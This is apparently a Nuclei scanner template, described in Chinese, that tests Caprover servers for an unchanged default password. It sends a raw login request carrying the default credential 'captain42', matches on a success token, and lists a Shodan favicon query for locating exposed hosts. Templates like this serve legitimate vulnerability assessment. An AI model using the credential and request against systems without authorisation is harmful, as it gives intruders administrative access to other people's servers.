id: caprover-default-login

info:
  name: Caprover 默认口令登录（弱口令）
  author: ritikchaddha
  severity: high
  description: |
    该模板通过尝试 Caprover 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:988422585
  tags: caprover,default-login,misconfig,vuln

variables:
  password: captain42

http:
  - raw:
      - |
        POST /api/v2/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        x-namespace: captain

        {"password":"{{password}}"}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "status\":100", "Login succeeded", "token\":")'
          - 'contains(header, "application/json")'
          - 'status_code == 200'
        condition: and
